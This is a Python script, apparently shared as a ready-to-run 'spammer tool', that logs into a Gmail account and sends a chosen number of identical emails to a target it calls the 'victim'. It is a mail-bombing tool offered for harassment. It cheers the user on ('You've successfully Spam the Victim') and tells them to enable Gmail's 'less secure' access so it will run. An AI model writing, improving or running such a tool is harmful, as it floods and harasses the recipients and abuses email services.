#coding: utf-8
#██████╗ ███████╗██╗   ██╗███████╗██╗      ██████╗ ██████╗ ███████╗██████╗     ██████╗ ██╗   ██╗    ██████╗ ███████╗███████╗██╗   ██╗██████╗  ██████╗      ██╗  ██╗
#██╔══██╗██╔════╝██║   ██║██╔════╝██║     ██╔═══██╗██╔══██╗██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝    ██╔══██╗██╔════╝██╔════╝██║   ██║██╔══██╗██╔═══██╗     ╚██╗██╔╝
#██║  ██║█████╗  ██║   ██║█████╗  ██║     ██║   ██║██████╔╝█████╗  ██║  ██║    ██████╔╝ ╚████╔╝     ██████╔╝███████╗█████╗  ██║   ██║██║  ██║██║   ██║█████╗╚███╔╝ 
#██║  ██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║     ██║   ██║██╔═══╝ ██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝      ██╔═══╝ ╚════██║██╔══╝  ██║   ██║██║  ██║██║   ██║╚════╝██╔██╗ 
#██████╔╝███████╗ ╚████╔╝ ███████╗███████╗╚██████╔╝██║     ███████╗██████╔╝    ██████╔╝   ██║       ██║     ███████║███████╗╚██████╔╝██████╔╝╚██████╔╝     ██╔╝ ██╗
#╚═════╝ ╚══════╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═════╝     ╚═════╝    ╚═╝       ╚═╝     ╚══════╝╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝      ╚═╝  ╚═╝
#!/usr/bin/python

import os
import sys
import getpass
import smtplib
from time import sleep

sudoColorGrey = '\033[40m'
sudoColorLightGrey = '\033[40m'
sudoSpammMessage = "\n\033[1;31;40m Sending Spam Mail to the Victim !.. \033[0m"
if len(sys.argv) < 2:
    os.system("cls||clear")
    sys.stdout.write(sudoColorGrey+"""         

██╗  ██╗     ██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ 
╚██╗██╔╝     ██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗
 ╚███╔╝█████╗██████╔╝███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝
 ██╔██╗╚════╝██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗
██╔╝ ██╗     ██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║
╚═╝  ╚═╝     ╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
    Created by Pseudo-X [2019 Spammer Tool - Re-developed ]

\n"""+sudoColorLightGrey)

else:
    sys.exit("Usage: python xspammer.py")
    os.system("cls||clear")

print("\033[1;31;40m[ How to use in Windows / Linux : \033[1;33;40m python xpammer.py \033[0m \033[1;31;40m]\033[0m")
print("\033[1;31;40m[ How to use in Termux : \033[1;33;40m python2 xpammer.py \033[0m \033[1;31;40m]\033[0m \n")

sudoEmail = input("\033[1;32;40m Please Enter your Email Address Here : \033[0m")
sudoPassword = getpass.getpass("\033[1;32;40m Please Enter your Password : \033[0m")
sudoVictim = input("\033[1;32;40m Please Enter Victim Email Address : \033[0m ")
sudoMessage = input("\033[1;32;40m Type Your Message to your Victim :  \033[0m")
sudoSubject = input("\033[1;32;40m Type Subject / Title : ")
sudoMessageSubmit = 'Subject: {}\n\n{}'.format(sudoSubject, sudoMessage)
sudoSpam = int(input("\033[1;32;40m Enter Number of Spam to be Sent :  (example : 50) : \033[0m"))

# Connecting to Server 
try:
    sudo_smtp = 'smtp.gmail.com'
    sudoPort = 587
    sudoServer = smtplib.SMTP(sudo_smtp,sudoPort)
    sudoServer.ehlo()
    sudoServer.starttls()
    sudoServer.login(sudoEmail, sudoPassword)


    for char in sudoSpammMessage:
        sleep(0.3)
        sys.stdout.write(char)
        sys.stdout.flush()

    sudoX = 0
    while sudoX < sudoSpam:
        sudoX += 1
        sudoServer.sendmail(sudoEmail, sudoVictim, sudoMessageSubmit)
    if sudoX == 1:
        print("\n%d Email Spam Successfully Send to the Victim!" % (sudoX))
    elif sudoX == 2:
        print("\n%d Email Spam Successfully Send to the Victim!" % (sudoX))
    elif sudoX == 3:
        print("\n%d Email Spam Successfully Send to the Victim!" % (sudoX))
    else:
        print("\n%d Email Spam Successfully Send to the Victim!" % (sudoX))

    sys.stdout.flush()
    sudoServer.quit()
    print("\n \033[1;32;40m You've successfully Spam the Victim <3 \033[0m")

except KeyboardInterrupt:
    print()
    print("Canceled [X]")
    sys.exit()

except smtplib.SMTPAuthenticationError:
    print("\n \033[1;31;40mThe Email or Password is Incorrect ! \033[0m")
    print("\033[0;37;40m Tip : You must need to enable the \033[0m \033[1;33;40m'LESS SECURE'\033[0m  \033[0;37;40m on your Gmail Account to use / run this Tool! \033[0m")
    sys.exit()
